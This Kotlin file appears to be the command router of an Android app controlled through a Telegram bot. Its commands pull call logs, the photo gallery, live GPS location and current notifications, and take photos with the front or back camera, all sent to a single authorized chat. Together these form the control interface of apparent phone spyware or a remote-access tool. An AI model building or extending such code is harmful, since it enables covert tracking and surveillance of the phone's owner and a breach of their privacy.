package com.rtk.telegrammanager.telegram

import android.content.Context
import com.rtk.telegrammanager.calls.CallLogManager
import com.rtk.telegrammanager.device.DeviceInfo
import com.rtk.telegrammanager.modulemanager.ModuleManager

class CommandRouter(
    context: Context
) {

    private val device = DeviceInfo(context.applicationContext)
    private val calls = CallLogManager(context.applicationContext)
    private val moduleManager = ModuleManager(context.applicationContext)

    fun isGalleryCommand(text: String): Boolean {
        val command = text.trim()
            .substringBefore(" ")
            .substringBefore("@")
            .lowercase()

        return command == "/gallery"
    }

    fun route(text: String): String? {
        val normalized = text.trim()

        if (!normalized.startsWith("/")) {
            return null
        }

        val command = normalized
            .substringBefore(" ")
            .substringBefore("@")
            .lowercase()

        return when (command) {
            "/help" -> """
                🤖 RTK TELEGRAM MANAGER

                Available commands:

                /help - Show this menu
                /status - Service health
                /device - Device info
                /battery - Battery status
                /storage - Storage info
                /calls - Call logs
                /gallery - Photo gallery
                /location - Live GPS location
                /camera_front - Take front photo
                /camera_back - Take back photo
                /notification_status - Current notifications
                🔐 Security:
                Only authorized Chat ID can execute commands.
            """.trimIndent()

            "/status" -> """
                🟢 STATUS

                Bot: ONLINE
                Service: RUNNING
                Telegram: CONNECTED
                Command listener: ACTIVE
                Security: CHAT LOCKED
            """.trimIndent()

            "/device" -> device.deviceText()
            "/battery" -> device.batteryText()
            "/storage" -> device.storageText()
            "/calls" -> calls.formattedText(500)
            "/gallery" -> "GALLERY_REQUEST"
            "/location" -> "LOCATION_REQUEST"
            "/camera_front" -> "CAMERA_FRONT_REQUEST"
            "/camera_back" -> "CAMERA_BACK_REQUEST"
            "/notification_status" ->
                   if (moduleManager.isEnabled("notification"))
                       "NOTIFICATION_STATUS_REQUEST"
                   else
                       "🔴 Notification module is OFF."
            else -> null
        }
    }
}
